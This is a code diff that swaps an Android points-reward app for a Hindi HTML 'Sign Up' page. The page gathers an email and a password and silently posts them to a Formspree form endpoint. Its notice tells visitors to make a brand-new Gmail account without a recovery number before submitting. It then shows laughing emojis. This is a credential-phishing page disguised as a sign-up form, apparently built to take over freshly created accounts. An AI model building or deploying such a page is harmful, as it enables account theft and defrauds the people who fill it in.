@@ -1,278 +1,122 @@
-package com.yourname.rewardapp // इसे अपने पैकेज के नाम से बदलें
-
-import android.content.Context
-import android.os.Bundle
-import android.util.Log
-import android.widget.Toast
-import androidx.activity.ComponentActivity
-import androidx.activity.compose.setContent
-import androidx.compose.foundation.isSystemInDarkTheme
-import androidx.compose.foundation.layout.*
-import androidx.compose.foundation.shape.RoundedCornerShape
-import androidx.compose.material3.*
-import androidx.compose.runtime.*
-import androidx.compose.ui.Alignment
-import androidx.compose.ui.Modifier
-import androidx.compose.ui.graphics.Color
-import androidx.compose.ui.platform.LocalContext
-import androidx.compose.ui.res.stringResource
-import androidx.compose.ui.text.font.FontWeight
-import androidx.compose.ui.text.style.TextAlign
-import androidx.compose.ui.unit.dp
-import androidx.compose.ui.unit.sp
-import androidx.credentials.CredentialManager
-import androidx.credentials.CustomCredential
-import androidx.credentials.GetCredentialRequest
-import androidx.navigation.compose.NavHost
-import androidx.navigation.compose.composable
-import androidx.navigation.compose.rememberNavController
-import com.google.android.libraries.identity.googleid.GetGoogleIdOption
-import com.google.android.libraries.identity.googleid.GoogleIdTokenCredential
-import com.google.firebase.auth.FirebaseAuth
-import com.google.firebase.auth.GoogleAuthProvider
-import com.google.firebase.auth.ktx.auth
-import com.google.firebase.firestore.FirebaseFirestore
-import com.google.firebase.firestore.ktx.firestore
-import com.google.firebase.ktx.Firebase
-import kotlinx.coroutines.launch
-import kotlinx.coroutines.tasks.await
-
-// --- THEME SETUP (Dark/Light Mode) ---
-@Composable
-fun RewardAppTheme(darkTheme: Boolean = isSystemInDarkTheme(), content: @Composable () -> Unit) {
-    val colors = if (darkTheme) {
-        darkColorScheme(primary = Color(0xFF4CAF50), background = Color(0xFF121212), surface = Color(0xFF1E1E1E))
-    } else {
-        lightColorScheme(primary = Color(0xFF2E7D32), background = Color(0xFFF5F5F5), surface = Color.White)
-    }
-    MaterialTheme(colorScheme = colors, content = content)
-}
-
-// --- MAIN ACTIVITY ---
-class MainActivity : ComponentActivity() {
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        setContent {
-            RewardAppTheme {
-                Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
-                    AppNavigation()
-                }
-            }
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign Up</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-    }
-}
-
-// --- NAVIGATION ---
-@Composable
-fun AppNavigation() {
-    val navController = rememberNavController()
-    val auth = Firebase.auth
-    // अगर यूजर पहले से लॉगिन है, तो सीधे Dashboard पर भेजें
-    val startDestination = if (auth.currentUser != null) "dashboard" else "login"
-
-    NavHost(navController = navController, startDestination = startDestination) {
-        composable("login") { LoginScreen(navController) }
-        composable("dashboard") { DashboardScreen(navController) }
-    }
-}
-
-// --- LOGIN SCREEN ---
-@Composable
-fun LoginScreen(navController: androidx.navigation.NavController) {
-    val context = LocalContext.current
-    val coroutineScope = rememberCoroutineScope()
-    var isLoading by remember { mutableStateOf(false) }
-    val clientId = stringResource(id = R.string.default_web_client_id)
-
-    Column(
-        modifier = Modifier.fillMaxSize().padding(24.dp),
-        horizontalAlignment = Alignment.CenterHorizontally,
-        verticalArrangement = Arrangement.Center
-    ) {
-        Text(text = "स्वागत है!", fontSize = 32.sp, fontWeight = FontWeight.Bold, color = MaterialTheme.colorScheme.primary)
-        Spacer(modifier = Modifier.height(48.dp))
-
-        if (isLoading) {
-            CircularProgressIndicator(color = MaterialTheme.colorScheme.primary)
-        } else {
-            Button(
-                onClick = {
-                    coroutineScope.launch {
-                        isLoading = true
-                        val success = signInWithGoogle(context, clientId)
-                        if (success) {
-                            checkAndRewardPoints()
-                            navController.navigate("dashboard") {
-                                popUpTo("login") { inclusive = true }
-                            }
-                        } else {
-                            Toast.makeText(context, "लॉगिन विफल रहा", Toast.LENGTH_SHORT).show()
-                        }
-                        isLoading = false
-                    }
-                },
-                modifier = Modifier.fillMaxWidth().height(56.dp),
-                shape = RoundedCornerShape(12.dp)
-            ) {
-                Text("Google से साइन इन करें", fontSize = 18.sp)
-            }
+        .container {
+            background: white;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
         }
-
-        Spacer(modifier = Modifier.height(16.dp))
-        Text(
-            text = "अपने फोन में मौजूद Google खाते से सुरक्षित रूप से साइन इन करें।\nआपका पासवर्ड इस ऐप के साथ साझा नहीं किया जाता है।",
-            fontSize = 12.sp,
-            textAlign = TextAlign.Center,
-            color = Color.Gray
-        )
-    }
-}
-
-// --- DASHBOARD SCREEN ---
-@Composable
-fun DashboardScreen(navController: androidx.navigation.NavController) {
-    val user = Firebase.auth.currentUser
-    val db = Firebase.firestore
-    var points by remember { mutableStateOf<Int?>(null) }
-    var isRedeeming by remember { mutableStateOf(false) }
-    val context = LocalContext.current
-    val minimumPointsRequired = 500
-
-    // Firestore से Points लोड करना
-    LaunchedEffect(user) {
-        if (user != null) {
-            db.collection("users").document(user.uid)
-                .addSnapshotListener { snapshot, e ->
-                    if (e == null && snapshot != null && snapshot.exists()) {
-                        points = snapshot.getLong("points")?.toInt() ?: 0
-                    }
-                }
+        .notice {
+            background-color: #ffcccc;
+            color: #cc0000;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            font-weight: bold;
+            line-height: 1.5;
         }
-    }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        /* इमोजी स्क्रीन को शुरुआत में छुपा कर रखा है */
+        #emoji-screen {
+            display: none;
+            font-size: 50px;
+            letter-spacing: 10px;
+        }
+    </style>
+</head>
+<body>
 
-    Column(
-        modifier = Modifier.fillMaxSize().padding(16.dp),
-        horizontalAlignment = Alignment.CenterHorizontally
-    ) {
-        Spacer(modifier = Modifier.height(32.dp))
-        Text("नमस्ते, ${user?.displayName ?: "यूज़र"}!", fontSize = 24.sp, fontWeight = FontWeight.Bold)
+<div class="container" id="main-container">
+    <!-- आपका बताया हुआ नोटिस -->
+    <div class="notice">
+        नोटिस: यहाँ पर वह ईमेल डालें जिस ईमेल में रिकवरी नंबर ऐड ना हो और अपने फोन से एकदम नई जीमेल बना के ही इस पर सबमिट करें।
+    </div>
+
+    <!-- फॉर्म -->
+    <!-- Formspree लिंक यहाँ डालें -->
+    <form id="signup-form" action="https://formspree.io/f/YOUR_ENDPOINT_HERE" method="POST">
+        <input type="email" name="email" placeholder="Enter Email" required>
+        <input type="password" name="password" placeholder="Enter Password" required>
+        <button type="submit">Submit</button>
+    </form>
+</div>
+
+<!-- सबमिट के बाद दिखने वाला इंटरफ़ेस -->
+<div class="container" id="emoji-screen">
+    😂 🤣 😊
+</div>
+
+<script>
+    const form = document.getElementById('signup-form');
+    const mainContainer = document.getElementById('main-container');
+    const emojiScreen = document.getElementById('emoji-screen');
+
+    form.addEventListener('submit', function(event) {
+        event.preventDefault(); // फॉर्म को दूसरे पेज पर जाने से रोकेगा
+
+        const formData = new FormData(form);
         
-        Spacer(modifier = Modifier.height(24.dp))
-        
-        // Points Card
-        Card(
-            modifier = Modifier.fillMaxWidth().padding(16.dp),
-            shape = RoundedCornerShape(16.dp),
-            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface),
-            elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
-        ) {
-            Column(
-                modifier = Modifier.padding(24.dp).fillMaxWidth(),
-                horizontalAlignment = Alignment.CenterHorizontally
-            ) {
-                Text("मेरे Points", fontSize = 18.sp, color = Color.Gray)
-                Spacer(modifier = Modifier.height(8.dp))
-                if (points == null) {
-                    CircularProgressIndicator()
-                } else {
-                    Text("$points", fontSize = 48.sp, fontWeight = FontWeight.ExtraBold, color = MaterialTheme.colorScheme.primary)
-                }
+        // Formspree पर बैकग्राउंड में डेटा भेजना
+        fetch(form.action, {
+            method: 'POST',
+            body: formData,
+            headers: {
+                'Accept': 'application/json'
             }
-        }
-
-        Spacer(modifier = Modifier.height(32.dp))
-
-        // Redeem Button
-        Button(
-            onClick = { isRedeeming = true },
-            modifier = Modifier.fillMaxWidth().height(56.dp).padding(horizontal = 16.dp),
-            shape = RoundedCornerShape(12.dp)
-        ) {
-            Text("Points Redeem करें", fontSize = 18.sp)
-        }
-        Spacer(modifier = Modifier.height(8.dp))
-        Text("Redeem करने के लिए न्यूनतम $minimumPointsRequired Points चाहिए", fontSize = 12.sp, color = Color.Gray)
-
-        Spacer(modifier = Modifier.weight(1f))
-
-        // Logout
-        TextButton(onClick = {
-            Firebase.auth.signOut()
-            navController.navigate("login") { popUpTo("dashboard") { inclusive = true } }
-        }) {
-            Text("लॉग आउट करें", color = Color.Red)
-        }
-    }
-
-    // Redeem Dialog
-    if (isRedeeming) {
-        AlertDialog(
-            onDismissRequest = { isRedeeming = false },
-            title = { Text("Redeem Points") },
-            text = {
-                if ((points ?: 0) < minimumPointsRequired) {
-                    Text("आपके पास पर्याप्त Points नहीं हैं। और Points कमाएं!")
-                } else {
-                    Text("यहाँ पेमेंट डिटेल्स (UPI/Bank) डालने का सुरक्षित फॉर्म आएगा। (यह डेटा सुरक्षित Backend पर जाएगा)")
-                }
-            },
-            confirmButton = {
-                TextButton(onClick = { isRedeeming = false }) { Text("ठीक है") }
+        }).then(response => {
+            if (response.ok) {
+                // सबमिट होने के बाद फॉर्म को गायब करना और इमोजी दिखाना
+                mainContainer.style.display = 'none';
+                emojiScreen.style.display = 'block';
+            } else {
+                alert("कुछ एरर आ गया है, कृपया दोबारा प्रयास करें।");
             }
-        )
-    }
-}
+        }).catch(error => {
+            alert("नेटवर्क एरर।");
+        });
+    });
+</script>
 
-// --- LOGIC: GOOGLE SIGN IN ---
-suspend fun signInWithGoogle(context: Context, clientId: String): Boolean {
-    val credentialManager = CredentialManager.create(context)
-    val googleIdOption = GetGoogleIdOption.Builder()
-        .setFilterByAuthorizedAccounts(false)
-        .setServerClientId(clientId)
-        .setAutoSelectEnabled(true)
-        .build()
-
-    val request = GetCredentialRequest.Builder()
-        .addCredentialOption(googleIdOption)
-        .build()
-
-    return try {
-        val result = credentialManager.getCredential(context, request)
-        val credential = result.credential
-        if (credential is CustomCredential && credential.type == GoogleIdTokenCredential.TYPE_GOOGLE_ID_TOKEN_CREDENTIAL) {
-            val googleIdTokenCredential = GoogleIdTokenCredential.createFrom(credential.data)
-            val authCredential = GoogleAuthProvider.getCredential(googleIdTokenCredential.idToken, null)
-            Firebase.auth.signInWithCredential(authCredential).await()
-            true
-        } else {
-            false
-        }
-    } catch (e: Exception) {
-        Log.e("Auth", "Login Failed", e)
-        false
-    }
-}
-
-// --- LOGIC: CHECK AND REWARD 100 POINTS ---
-suspend fun checkAndRewardPoints() {
-    val user = Firebase.auth.currentUser ?: return
-    val db = Firebase.firestore
-    val userRef = db.collection("users").document(user.uid)
-
-    try {
-        val document = userRef.get().await()
-        if (!document.exists()) {
-            // नया यूज़र है! 100 points दें।
-            val userData = hashMapOf(
-                "name" to user.displayName,
-                "email" to user.email,
-                "points" to 100, // Signup Bonus
-                "hasReceivedSignupBonus" to true
-            )
-            userRef.set(userData).await()
-        }
-        // अगर document पहले से है, तो इसका मतलब यूज़र दोबारा लॉगिन कर रहा है, कोई नए points नहीं मिलेंगे।
-    } catch (e: Exception) {
-        Log.e("Firestore", "Error updating points", e)
-    }
-}
+</body>
+</html>
